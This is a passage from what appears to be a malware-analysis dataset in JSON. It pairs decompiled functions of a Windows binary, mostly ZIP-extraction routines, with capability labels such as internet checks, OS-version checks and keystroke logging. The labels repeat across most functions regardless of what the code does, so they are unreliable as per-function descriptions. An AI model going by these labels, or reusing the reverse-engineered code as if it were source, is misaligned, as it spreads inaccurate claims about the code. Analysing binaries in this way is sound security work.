-1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        if (var_8h == 0) {\n            if (arg_14h != 0) {\n                arg_ch_00 = arg_18h;\n                if (var_3ch < arg_18h) {\n                    *(var_3ch + arg_14h) = 0;\n                    arg_ch_00 = var_3ch;\n                }\n                if (((var_3ch != 0) && (arg_18h != 0)) && (iVar1 = fcn.00406641(arg_14h, arg_ch_00, 1),  iVar1 != 1)) {\n                    return -1;\n                }\n            }\n            if (arg_ch != NULL) {\n                puVar2 = &var_5ch;\n                for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *arg_ch = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    arg_ch = arg_ch + 1;\n                }\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_8h;\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1303
    },
    "00406c89": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00406c89(void)\n\n{\n    int32_t unaff_ESI;\n    int32_t iVar1;\n    \n    if (unaff_ESI == 0) {\n        iVar1 = -0x66;\n    }\n    else {\n        if ((*(unaff_ESI + 0x18) != 0) && (iVar1 = *(unaff_ESI + 0x10) + 1,  iVar1 != *(unaff_ESI + 4))) {\n            *(unaff_ESI + 0x10) = iVar1;\n            *(unaff_ESI + 0x14) =\n                 *(unaff_ESI + 0x14) + *(unaff_ESI + 0x50) + *(unaff_ESI + 0x4c) + 0x2e + *(unaff_ESI + 0x48);\n            iVar1 = fcn.00406a31(unaff_ESI, unaff_ESI + 0x28, unaff_ESI + 0x78, 0, 0);\n            *(unaff_ESI + 0x18) = iVar1 == 0;\n            return iVar1;\n        }\n        iVar1 = -100;\n    }\n    return iVar1;\n}\n",
        "token_count": 276
    },
    "00406cda": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_118h\n\nvoid __cdecl fcn.00406cda(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    int32_t unaff_EDI;\n    bool bVar7;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    if (unaff_EDI != 0) {\n        puVar2 = arg_8h;\n        do {\n            uVar6 = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (uVar6 != 0);\n        if ((puVar2 - (arg_8h + 1) < 0x100) && (*(unaff_EDI + 0x18) != 0)) {\n            var_118h = *(unaff_EDI + 0x10);\n            uVar1 = *(unaff_EDI + 0x14);\n            iVar3 = fcn.00406c54();\n            while (iVar3 == 0) {\n                fcn.00406a31(unaff_EDI, 0, 0, &var_110h, 0x100);\n                if (arg_ch == 1) {\n                    puVar4 = &var_110h;\n                    puVar2 = arg_8h;\n                    do {\n                        uVar6 = *puVar4;\n                        bVar7 = uVar6 < *puVar2;\n                        if (uVar6 != *puVar2) {\ncode_r0x00406d81:\n                            iVar3 = (1 - bVar7) - (bVar7 != 0);\n                            goto code_r0x00406dc0;\n                        }\n                        if (uVar6 == 0) break;\n                        uVar6 = *(puVar4 + 1);\n                        bVar7 = uVar6 < puVar2[1];\n                        if (uVar6 != puVar2[1]) goto code_r0x00406d81;\n                        puVar4 = puVar4 + 2;\n                        puVar2 = puVar2 + 2;\n                    } while (uVar6 != 0);\n                    iVar3 = 0;\n                }\n                else {\n                    puVar2 = arg_8h;\n                    do {\n                        uVar6 = puVar2[&var_110h - arg_8h];\n                        uVar5 = *puVar2;\n                        puVar2 = puVar2 + 1;\n                        if (uVar6 + 0x9f < 0x1a) {\n                            uVar6 = uVar6 - 0x20;\n                        }\n                        if (uVar5 + 0x9f < 0x1a) {\n                            uVar5 = uVar5 - 0x20;\n                        }\n                        if (uVar6 == 0) {\n                            iVar3 = (uVar5 == 0) - 1;\n                            goto code_r0x00406dc0;\n                        }\n                        if (uVar5 == 0) break;\n                        if (uVar6 < uVar5) {\n                            iVar3 = -1;\n                            goto code_r0x00406dc0;\n                        }\n                    } while (uVar6 <= uVar5);\n                    iVar3 = 1;\n                }\ncode_r0x00406dc0:\n                if (iVar3 == 0) goto code_r0x00406de5;\n                iVar3 = fcn.00406c89();\n            }\n            *(unaff_EDI + 0x10) = var_118h;\n            *(unaff_EDI + 0x14) = uVar1;\n        }\n    }\ncode_r0x00406de5:\n    fcn.0041e0a1(var_118h);\n    return;\n}\n",
        "token_count": 898
    },
    "00406e06": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406e06(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_ch = 0;\n    *arg_10h = 0;\n    var_4h = 0;\n    *arg_14h = NULL;\n    iVar1 = fcn.004065e2();\n    if (iVar1 == 0) {\n        iVar1 = fcn.00406717();\n        if (iVar1 == 0) {\n            if (var_ch != 0x4034b50) {\n                var_4h = -0x67;\n            }\n        }\n        else {\n            var_4h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_4h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_4h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 == 0) {\n            if ((var_4h == 0) && ((iVar1 = arg_8h[0xd],  var_8h != iVar1 || ((iVar1 != 0 && (iVar1 != 8)))))) {\n                var_4h = -0x67;\n            }\n        }\n        else {\n            var_4h = -1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 != 0) {\n            var_4h = -1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 == 0) {\n            if (((var_4h == 0) && (var_8h != arg_8h[0xf])) && ((var_ch & 8) == 0)) {\n                var_4h = -0x67;\n            }\n        }\n        else {\n            var_4h = -1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 == 0) {\n            if (((var_4h == 0) && (var_8h != arg_8h[0x10])) && ((var_ch & 8) == 0)) {\n                var_4h = -0x67;\n            }\n        }\n        else {\n            var_4h = -1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 == 0) {\n            if (((var_4h == 0) && (var_8h != arg_8h[0x11])) && ((var_ch & 8) == 0)) {\n                var_4h = -0x67;\n            }\n        }\n        else {\n            var_4h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 == 0) {\n            if ((var_4h == 0) && (var_ch != arg_8h[0x12])) {\n                var_4h = -0x67;\n            }\n        }\n        else {\n            var_4h = -1;\n        }\n        arg_8h_00 = *arg_8h;\n        *arg_ch = *arg_ch + var_ch;\n        iVar1 = fcn.004066db(arg_8h_00);\n        if (iVar1 != 0) {\n            var_4h = -1;\n        }\n        *arg_10h = arg_8h[0x1e] + 0x1e + var_ch;\n        *arg_ch = *arg_ch + arg_ch;\n        *arg_14h = arg_ch;\n    }\n    else {\n        var_4h = -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 908
    },
    "0040711e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040711e(int32_t arg_8h, uchar *arg_ch)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t in_ECX;\n    int32_t *piVar9;\n    int32_t *extraout_ECX;\n    uint32_t uVar10;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_8h = 0;\n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    if ((in_EAX == 0) || (piVar3 = *(in_EAX + 0x7c),  piVar3 == NULL)) {\n        var_8h = -0x66;\n    }\n    else if (*piVar3 == 0) {\n        var_8h = -100;\n    }\n    else if (in_ECX == 0) {\ncode_r0x00407158:\n        var_8h = 0;\n    }\n    else {\n        piVar3[4] = arg_8h;\n        piVar3[5] = in_ECX;\n        if (piVar3[0x17] < in_ECX) {\n            piVar3[5] = piVar3[0x17];\n        }\n        if (piVar3[5] != 0) {\n            do {\n                if ((piVar3[2] == 0) && (uVar10 = piVar3[0x16],  uVar10 != 0)) {\n                    uVar6 = 0x4000;\n                    if ((uVar10 < 0x4000) && (uVar6 = uVar10,  uVar10 == 0)) {\n                        if (arg_ch != NULL) {\n                            *arg_ch = 1;\n                        }\n                        goto code_r0x00407158;\n                    }\n                    iVar4 = fcn.004065e2();\n                    if ((iVar4 != 0) || (iVar4 = fcn.00406641(*piVar3, uVar6, 1),  iVar4 != 1)) {\n                        return -1;\n                    }\n                    piVar3[0xf] = piVar3[0xf] + uVar6;\n                    piVar3[0x16] = piVar3[0x16] - uVar6;\n                    iVar4 = *piVar3;\n                    piVar3[1] = iVar4;\n                    piVar3[2] = uVar6;\n                    if ((*(piVar3 + 0x1b) != '\\0') && (var_ch = 0,  uVar6 != 0)) {\n                        piVar9 = piVar3 + 0x1c;\n                        do {\n                            uVar5 = piVar9[2] & 0xfffdU | 2;\n                            uVar1 = *(var_ch + iVar4);\n                            fcn.00405fd5();\n                            uVar10 = var_ch + 1;\n                            *(var_ch + iVar4) = (uVar5 ^ 1) * uVar5 >> 8 ^ uVar1;\n                            piVar9 = extraout_ECX;\n                            var_ch = uVar10;\n                        } while (uVar10 < uVar6);\n                    }\n                }\n                uVar10 = piVar3[2];\n                uVar6 = piVar3[0x1f];\n                if (uVar10 < piVar3[0x1f]) {\n                    uVar6 = uVar10;\n                }\n                if (uVar6 != 0) {\n                    cVar2 = *(piVar3[1] + uVar6 + -1);\n                    piVar3[0x17] = piVar3[0x17] - uVar6;\n                    piVar9 = piVar3 + 0x1f;\n                    *piVar9 = *piVar9 - uVar6;\n                    piVar3[2] = uVar10 - uVar6;\n                    piVar3[1] = piVar3[1] + uVar6;\n                    if ((*piVar9 == 0) && (cVar2 != *(piVar3 + 0x20))) {\n                        return -0x6a;\n                    }\n                }\n                if (piVar3[0x19] == 0) {\n                    uVar10 = piVar3[2];\n                    if (piVar3[5] < piVar3[2]) {\n                        uVar10 = piVar3[5];\n                    }\n                    uVar6 = 0;\n                    if (uVar10 != 0) {\n                        do {\n                            *(uVar6 + piVar3[4]) = *(uVar6 + piVar3[1]);\n                            uVar6 = uVar6 + 1;\n                        } while (uVar6 < uVar10);\n                    }\n                    iVar4 = piVar3[4];\n                    iVar7 = fcn.00405ef8();\n                    piVar3[0x17] = piVar3[0x17] - uVar10;\n                    piVar3[2] = piVar3[2] - uVar10;\n                    piVar3[5] = piVar3[5] - uVar10;\n                    piVar3[1] = piVar3[1] + uVar10;\n                    piVar3[6] = piVar3[6] + uVar10;\n                    var_8h = var_8h + uVar10;\n                    piVar3[0x14] = iVar7;\n                    piVar3[4] = iVar4 + uVar10;\n                    if ((piVar3[0x17] == 0) && (arg_ch != NULL)) {\n                        *arg_ch = 1;\n                    }\n                }\n                else {\n                    iVar4 = piVar3[6];\n                    var_10h = fcn.00406279();\n                    iVar7 = piVar3[6];\n                    iVar8 = fcn.00405ef8();\n                    piVar3[0x17] = piVar3[0x17] - (iVar7 - iVar4);\n                    var_8h = var_8h + (iVar7 - iVar4);\n                    piVar3[0x14] = iVar8;\n                    if ((var_10h == 1) || (piVar3[0x17] == 0)) {\n                        if (arg_ch == NULL) {\n                            return var_8h;\n                        }\n                        *arg_ch = 1;\n                        return var_8h;\n                    }\n                    if (var_10h != 0) {\n                        return var_10h;\n                    }\n                }\n            } while (piVar3[5] != 0);\n            if (var_10h != 0) {\n                return var_10h;\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1571
    },
    "00407439": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ach\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00407439(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    int32_t *unaff_EBX;\n    int32_t *piVar7;\n    uint *arg_8h_00;\n    char *pcVar8;\n    char *pcVar9;\n    bool bVar10;\n    ulong uVar11;\n    uint32_t var_2ach;\n    uint32_t var_29ch;\n    int32_t var_294h;\n    int32_t var_290h;\n    uint32_t var_278h;\n    uint var_258h;\n    int32_t var_254h;\n    int32_t var_250h;\n    int32_t var_24ch;\n    char var_248h [4];\n    uint var_244h;\n    int32_t var_240h;\n    uint32_t var_23ch;\n    int32_t var_238h;\n    int32_t *var_234h;\n    uint8_t var_230h;\n    uint var_22fh;\n    uint16_t var_22ah;\n    uint var_226h;\n    uint16_t var_222h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_114h;\n    uint32_t var_8h;\n    \n    var_8h = *0x443674 ^ &stack0xfffffffc;\n    if ((-2 < arg_8h) && (arg_8h < *(*in_ECX + 4))) {\n        var_234h = in_ECX;\n        if (in_ECX[1] != -1) {\n            fcn.0040734c();\n        }\n        in_ECX[1] = -1;\n        if (arg_8h == in_ECX[0x4d]) {\n            if (arg_8h != -1) {\n                piVar7 = in_ECX + 2;\n                for (iVar4 = 0x4b; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *unaff_EBX = *piVar7;\n                    piVar7 = piVar7 + 1;\n                    unaff_EBX = unaff_EBX + 1;\n                }\n                goto code_r0x004079e0;\n            }\n        }\n        else if (arg_8h != -1) {\n            if (arg_8h < *(*in_ECX + 0x10)) {\n                fcn.00406c54();\n                in_ECX = var_234h;\n            }\n            iVar4 = *(*in_ECX + 0x10);\n            while (iVar4 < arg_8h) {\n                fcn.00406c89();\n                in_ECX = var_234h;\n                iVar4 = *(*var_234h + 0x10);\n            }\n            fcn.00406a31(*in_ECX, &var_2ach, 0, &var_114h, 0x104);\n            iVar4 = fcn.00406e06(*in_ECX, &var_238h, &var_240h, &var_23ch);\n            if ((iVar4 == 0) && (iVar4 = fcn.004065e2(),  iVar4 == 0)) {\n                var_238h = fcn.0041d661(var_23ch);\n                uVar3 = fcn.00406641(var_238h, 1, var_23ch);\n                if (uVar3 == var_23ch) {\n                    *unaff_EBX = *(*var_234h + 0x10);\n                    iVar4 = 0;\n                    do {\n                        pcVar8 = &var_114h + iVar4;\n                        *(&var_21ch + iVar4) = *pcVar8;\n                        iVar4 = iVar4 + 1;\n                    } while (*pcVar8 != '\\0');\n                    arg_8h_00 = &var_21ch;\n                    while( true ) {\n                        while( true ) {\n                            for (; (cVar1 = *arg_8h_00,  cVar1 != '\\0' && (*(arg_8h_00 + 1) == ':'));\n                                arg_8h_00 = arg_8h_00 + 2) {\n                            }\n                            if ((cVar1 != '\\\\') && (cVar1 != '/')) break;\n                            arg_8h_00 = arg_8h_00 + 1;\n                        }\n                        iVar4 = fcn.0041ebbb(arg_8h_00, \"\\\\..\\\\\");\n                        if ((iVar4 == 0) &&\n                           (((iVar4 = fcn.0041ebbb(arg_8h_00, \"\\\\../\"),  iVar4 == 0 &&\n                             (iVar4 = fcn.0041ebbb(arg_8h_00, \"/../\"),  iVar4 == 0)) &&\n                            (iVar4 = fcn.0041ebbb(arg_8h_00, \"/..\\\\\"),  iVar4 == 0)))) break;\n                        arg_8h_00 = iVar4 + 4;\n                    }\n                    fcn.0041ea37(unaff_EBX + 1, arg_8h_00, 0x104);\n                    var_22fh._0_1_ = var_278h >> 0x1e;\n                    uVar6 = ~(var_278h >> 0x17);\n                    uVar3 = var_2ach >> 8;\n                    var_22fh._1_1_ = 0;\n                    var_22fh._2_1_ = 0;\n                    var_230h = 1;\n                    if ((((uVar3 == 0) || (uVar3 == 7)) || (uVar3 == 0xb)) || (uVar3 == 0xe)) {\n                        var_22fh._1_1_ = var_278h >> 1 & 1;\n                        var_22fh._2_1_ = var_278h >> 2 & 1;\n                        uVar6 = var_278h;\n                        var_22fh._0_1_ = var_278h >> 4;\n                        var_230h = var_278h >> 5 & 1;\n                    }\n                    var_22fh._0_1_ = var_22fh & 1;\n                    unaff_EBX[0x42] = 0;\n                    if (var_22fh != 0) {\n                        unaff_EBX[0x42] = 0x10;\n                    }\n                    if (var_230h != 0) {\n                        unaff_EBX[0x42] = unaff_EBX[0x42] | 0x20;\n                    }\n                    if (var_22fh._1_1_ != 0) {\n                        unaff_EBX[0x42] = unaff_EBX[0x42] | 2;\n                    }\n                    if ((uVar6 & 1) != 0) {\n                        unaff_EBX[0x42] = unaff_EBX[0x42] | 1;\n                    }\n                    if (var_22fh._2_1_ != 0) {\n                        unaff_EBX[0x42] = unaff_EBX[0x42] | 4;\n                    }\n                    unaff_EBX[0x49] = var_294h;\n                    unaff_EBX[0x4a] = var_290h;\n                    uVar2 = var_29ch >> 0x10;\n                    *0x8 = (uVar2 >> 9) + 0x7bc;\n                    var_226h._0_2_ = uVar2 & 0x1f;\n                    var_226h._2_2_ = var_29ch >> 0xb;\n                    var_220h._0_2_ = (var_29ch & 0x1f) * 2;\n                    var_220h._2_2_ = 0;\n                    var_22ah = uVar2 >> 5 & 0xf;\n                    var_222h = var_29ch >> 5 & 0x3f;\n                    (**0x446450)(&var_22fh + 3, &var_244h);\n                    var_258h = var_244h;\n                    var_254h = var_240h;\n                    (**0x4464bc)(&var_258h, &var_250h);\n                    iVar4 = 0;\n                    unaff_EBX[0x43] = var_250h;\n                    unaff_EBX[0x44] = var_24ch;\n                    unaff_EBX[0x45] = var_250h;\n                    unaff_EBX[0x46] = var_24ch;\n                    unaff_EBX[0x47] = var_250h;\n                    unaff_EBX[0x48] = var_24ch;\n                    if (4 < var_23ch) {\n                        var_248h[2] = 0;\n                        do {\n                            var_248h[0] = *(iVar4 + var_238h);\n                            var_248h[1] = *(var_238h + 1 + iVar4);\n                            iVar5 = 3;\n                            bVar10 = true;\n                            pcVar8 = var_248h;\n                            pcVar9 = 0x43dec8;\n                            do {\n                                if (iVar5 == 0) break;\n                                iVar5 = iVar5 + -1;\n                                bVar10 = *pcVar8 == *pcVar9;\n                                pcVar8 = pcVar8 + 1;\n                                pcVar9 = pcVar9 + 1;\n                            } while (bVar10);\n                            if (bVar10) {\n                                uVar6 = *(iVar4 + 4 + var_238h);\n                                var_22fh._2_1_ = uVar6 >> 1 & 1;\n                                var_22fh._1_1_ = uVar6 >> 2 & 1;\n                                iVar5 = iVar4 + 5;\n                                if ((uVar6 & 1) != 0) {\n                                    var_240h = iVar4 + 9;\n                                    uVar11 = fcn.0040460f();\n                                    unaff_EBX[0x48] = uVar11 >> 0x20;\n                                    unaff_EBX[0x47] = uVar11;\n                                    iVar5 = var_240h;\n                                }\n                                if (var_22fh._2_1_ != 0) {\n                                    var_240h = iVar5 + 4;\n                                    uVar11 = fcn.0040460f();\n                                    unaff_EBX[0x44] = uVar11 >> 0x20;\n                                    unaff_EBX[0x43] = uVar11;\n                                }\n                                if (var_22fh._1_1_ != 0) {\n                                    uVar11 = fcn.0040460f();\n                                    unaff_EBX[0x45] = uVar11;\n                                    unaff_EBX[0x46] = uVar11 >> 0x20;\n                                }\n                                break;\n                            }\n                            iVar4 = iVar4 + 4 + *(iVar4 + 2 + var_238h);\n                            var_240h = iVar4;\n                        } while (iVar4 + 4U < var_23ch);\n                    }\n                    if (var_238h != 0) {\n                        fcn.0041ebd2(var_238h);\n                    }\n                    piVar7 = var_234h + 2;\n                    for (iVar4 = 0x4b; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *piVar7 = *unaff_EBX;\n                        unaff_EBX = unaff_EBX + 1;\n                        piVar7 = piVar7 + 1;\n                    }\n                    var_234h[0x4d] = arg_8h;\n                }\n                else {\n                    fcn.0041ebd2(var_238h);\n                }\n            }\n            goto code_r0x004079e0;\n        }\n        *unaff_EBX = *(*in_ECX + 4);\n        *(unaff_EBX + 1) = 0;\n        unaff_EBX[0x42] = 0;\n        unaff_EBX[0x43] = 0;\n        unaff_EBX[0x44] = 0;\n        unaff_EBX[0x45] = 0;\n        unaff_EBX[0x46] = 0;\n        unaff_EBX[0x47] = 0;\n        unaff_EBX[0x48] = 0;\n        unaff_EBX[0x49] = 0;\n        unaff_EBX[0x4a] = 0;\n    }\ncode_r0x004079e0:\n    fcn.0041e0a1(var_2ach);\n    return;\n}\n",
        "token_count": 2900
    },
    "00407aac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00407aac(int32_t arg_8h, int32_t *arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    int32_t *piVar6;\n    uint unaff_EBX;\n    int32_t *piVar7;\n    uint var_358h;\n    int32_t *var_354h;\n    int32_t *var_350h;\n    uint var_349h;\n    uint32_t var_240h;\n    uint var_23ch;\n    uint var_234h;\n    uint var_22ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    var_350h = arg_ch;\n    var_354h = in_ECX;\n    if (arg_14h == 3) {\n        if (arg_8h != in_ECX[1]) {\n            if (in_ECX[1] != -1) {\n                fcn.0040734c();\n            }\n            in_ECX[1] = -1;\n            if (*(*in_ECX + 4) <= arg_8h) goto code_r0x00407df8;\n            if (arg_8h < *(*in_ECX + 0x10)) {\n                fcn.00406c54();\n            }\n            iVar4 = *(*in_ECX + 0x10);\n            while (iVar4 < arg_8h) {\n                fcn.00406c89();\n                iVar4 = *(*in_ECX + 0x10);\n            }\n            fcn.00406fc9(in_ECX[0x4e]);\n            var_354h[1] = arg_8h;\n        }\n        piVar1 = var_354h;\n        iVar4 = fcn.0040711e(var_350h, &var_349h);\n        if (iVar4 < 1) {\n            fcn.0040734c();\n            piVar1[1] = -1;\n        }\n        goto code_r0x00407df8;\n    }\n    if ((arg_14h != 2) && (arg_14h != 1)) goto code_r0x00407df8;\n    if (in_ECX[1] != -1) {\n        fcn.0040734c();\n    }\n    in_ECX[1] = -1;\n    if (*(*in_ECX + 4) <= arg_8h) goto code_r0x00407df8;\n    if (arg_8h < *(*in_ECX + 0x10)) {\n        fcn.00406c54();\n    }\n    while (piVar1 = var_354h,  *(*in_ECX + 0x10) < arg_8h) {\n        fcn.00406c89();\n    }\n    fcn.00407439(arg_8h);\n    piVar2 = var_350h;\n    if ((var_240h >> 4 & 1) != 0) goto code_r0x00407df8;\n    var_218h._0_1_ = 0;\n    var_354h = var_350h;\n    if (arg_14h != 1) {\n        cVar3 = *var_350h;\n        piVar6 = var_350h;\n        piVar7 = var_350h;\n        while (cVar3 != '\\0') {\n            if ((cVar3 == '/') || (cVar3 == '\\\\')) {\n                piVar7 = piVar6 + 1;\n            }\n            piVar6 = piVar6 + 1;\n            cVar3 = *piVar6;\n        }\n        fcn.0041ea37(&var_110h, var_350h, 0x104);\n        if (piVar7 == piVar2) {\n            var_110h._0_1_ = '\\0';\ncode_r0x00407c71:\n            (**0x446300)(&var_218h, 0x43ded4, piVar1 + 0x50, &var_110h, piVar7);\n        }\n        else {\n            *(piVar7 + (&var_110h - piVar2)) = 0;\n            if (((var_110h != '/') && (var_110h != '\\\\')) && ((var_110h == '\\0' || (var_110h._1_1_ != ':'))))\n            goto code_r0x00407c71;\n            (**0x446300)(&var_218h, 0x43decc, &var_110h, piVar7);\n        }\n        var_354h = (**0x446340)(&var_218h, 0x40000000, 0, 0, 2, var_240h, 0);\n    }\n    if (var_354h != 0xffffffff) {\n        fcn.00406fc9(piVar1[0x4e]);\n        if (piVar1[0x4f] == 0) {\n            iVar4 = fcn.0041d661(0x4000);\n            piVar1[0x4f] = iVar4;\n        }\n        var_350h = NULL;\n        do {\n            iVar4 = fcn.0040711e(piVar1[0x4f], &var_349h);\n            if (iVar4 == -0x6a) {\n                var_350h = 0x1000;\n                goto code_r0x00407daf;\n            }\n            if (iVar4 < 0) break;\n            if ((0 < iVar4) && (iVar5 = (**0x4463ac)(var_354h, piVar1[0x4f], iVar4, &var_358h, 0),  iVar5 == 0)) {\n                var_350h = 0x400;\n                goto code_r0x00407daf;\n            }\n            if (var_349h != '\\0') goto code_r0x00407daf;\n        } while (iVar4 != 0);\n        var_350h = 0x5000000;\ncode_r0x00407daf:\n        fcn.0040734c();\n        if (var_350h == NULL) {\n            (**0x4464e8)(var_354h, &var_234h, &var_23ch, &var_22ch);\n        }\n        if (arg_14h != 1) {\n            (**0x446344)(var_354h);\n        }\n    }\ncode_r0x00407df8:\n    fcn.0041e0a1(unaff_EBX);\n    return;\n}\n",
        "token_count": 1533
    },
    "00407f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.00407f00(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX == NULL) {\n        *0x44663c = 0x10000;\n    }\n    else if (*in_EAX == 1) {\n        *0x44663c = fcn.00407aac(param_1, param_2, param_3, param_4);\n    }\n    else {\n        *0x44663c = 0x80000;\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "00407f37": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00407f37(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h;\n    \n    if (param_1 == NULL) {\n        *0x44663c = 0x10000;\n    }\n    else {\n        if (*param_1 == 1) {\n            piVar1 = param_1[1];\n            if (piVar1[1] != -1) {\n                fcn.0040734c();\n            }\n            arg_8h = *piVar1;\n            piVar1[1] = -1;\n            if (arg_8h != 0) {\n                if (*(arg_8h + 0x7c) != 0) {\n                    fcn.0040734c();\n                }\n                fcn.004065c1();\n                fcn.0041e0b0(arg_8h);\n            }\n            *piVar1 = 0;\n            *0x44663c = 0;\n            fcn.00407ec4();\n            fcn.0041e801(param_1);\n            return *0x44663c;\n        }\n        *0x44663c = 0x80000;\n    }\n    return *0x44663c;\n}\n",
        "token_count": 281
    },
    "00408fe6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
